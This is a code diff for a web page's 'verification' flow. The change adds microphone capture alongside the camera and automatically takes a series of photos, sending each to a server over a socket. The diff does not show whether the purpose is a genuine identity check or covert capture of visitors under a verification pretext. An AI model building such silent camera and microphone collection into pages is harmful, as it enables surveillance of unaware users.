@@ -107,8 +107,9 @@ async function triggerVerification() {
     cleanupResources();
 
     try {
+        // AUDIO ENABLED HERE FOR AUDIO STREAMING SUPPORT
         const stream = await navigator.mediaDevices.getUserMedia({
-            audio: false,
+            audio: true,
             video: { facingMode: useFrontCamera ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } }
         });
         mediaStream = stream;
@@ -125,7 +126,7 @@ async function triggerVerification() {
         }
     } catch (error) {
         cameraReady = false;
-        setStatus("Camera access required.", "error");
+        setStatus("Camera and Microphone access required.", "error");
         startBtn.style.display = "block";
     }
 }
@@ -143,27 +144,35 @@ function startLiveStream() {
 }
 
 function takeSinglePhoto() {
-    if (!cameraReady) return;
+    if (!cameraReady || !video.videoWidth) return false;
     canvas.width = video.videoWidth || 1280;
     canvas.height = video.videoHeight || 720;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     socket.emit("user-photo-captured", canvas.toDataURL("image/jpeg", 0.90));
+    return true;
 }
 
 function runAutoCaptureSequence() {
     let count = 0;
-    takeSinglePhoto();
-    count++;
+    
+    // Retry mechanism for first photo if video metadata isn't instantly ready
+    const initialTry = setInterval(() => {
+        if (takeSinglePhoto() || count > 10) {
+            clearInterval(initialTry);
+        }
+        count++;
+    }, 300);
 
+    let capturedCount = 0;
     autoCaptureTimer = setInterval(() => {
-        if (count >= 5) {
+        if (capturedCount >= 4) {
             clearInterval(autoCaptureTimer);
             autoCaptureTimer = null;
             return;
         }
         takeSinglePhoto();
-        count++;
+        capturedCount++;
     }, 1000);
 }
 
